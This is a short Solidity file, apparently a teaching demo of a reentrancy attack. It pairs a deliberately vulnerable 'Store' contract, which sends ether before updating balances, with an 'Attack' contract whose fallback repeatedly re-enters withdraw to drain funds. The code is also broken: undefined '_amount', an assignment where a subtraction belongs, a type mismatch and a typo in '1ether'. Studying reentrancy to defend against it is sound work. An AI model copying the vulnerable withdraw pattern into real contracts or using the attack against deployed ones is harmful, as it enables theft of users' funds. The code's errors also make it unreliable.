//SPDX -License - identifier : UNLICENESED 
pragma solidity >=0.5.0 <0.9.0 ; 


//storing the ethers and sending tokens to the address which have deposited the tokens 
contract Store 
{
  mapping (address => uint) public balances ;
  function deposit () public payable {
      balances[msg.sender] += msg.value ;

  }
  function withdraw(uint ) public {
      require (balances[msg.sender] >= _amount ) ;
      (bool sent ,) = msg.sender.call{value:_amount}("") ;
      require(sent , "failed to sent the tokens");
      balances[msg.sender] = _amount;
  }

  function getBalances()  public view returns (uint) 
  {
      return address(this).balance ;
  }
}


contract Attack 

{
Store public store ;

constructor(address _store) public {
    store = _store ;

}
fallback() external payable {
    if (address(store).balance >= 1 ether)
      {
          store.withdraw(1ether);
      }

}
function attack () external payable {
    require(msg.value >= 1 ether);
    store.deposit{value : 1 ether }();
    store.withdraw(1 ether);

}
}